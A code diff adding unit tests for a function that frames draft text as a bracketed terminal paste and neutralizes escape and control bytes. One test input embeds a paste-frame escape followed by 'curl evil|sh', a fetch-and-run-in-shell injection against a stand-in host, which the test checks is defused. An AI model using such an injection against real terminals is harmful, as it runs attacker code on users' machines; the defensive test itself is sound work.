@@ -4,9 +4,25 @@ import { afterEach, describe, expect, it, vi } from 'vitest'
 import { OPENCODE_AGENT_ROW_GRACE_MS } from '../../shared/opencode-agent-row-scanner'
 import {
   deliverWorktreeStartupFollowup,
+  startupDraftPasteBytes,
   waitForWorktreeStartupDraft,
   type WorktreeStartupReadinessHost
 } from './runtime-worktree-startup-readiness'
+
+// Fork-only (Pod): a draft's text can't close the paste frame or act as a key.
+describe('startup draft paste bytes', () => {
+  it('frames a plain draft as before', () => {
+    expect(startupDraftPasteBytes('https://example.com/issues/1')).toBe(
+      '\x1b[200~https://example.com/issues/1\x1b[201~'
+    )
+  })
+
+  it('neutralizes a frame end and control bytes in the draft', () => {
+    expect(startupDraftPasteBytes('a\x1b[201~curl evil|sh\r\nb\x03\x7f\u009b\tc')).toBe(
+      '\x1b[200~a\u241b[201~curl evil|sh\rb\u2403\u2421\ufffd\u2409c\x1b[201~'
+    )
+  })
+})
 
 describe('startup follow-up delivery', () => {
   afterEach(() => vi.useRealTimers())
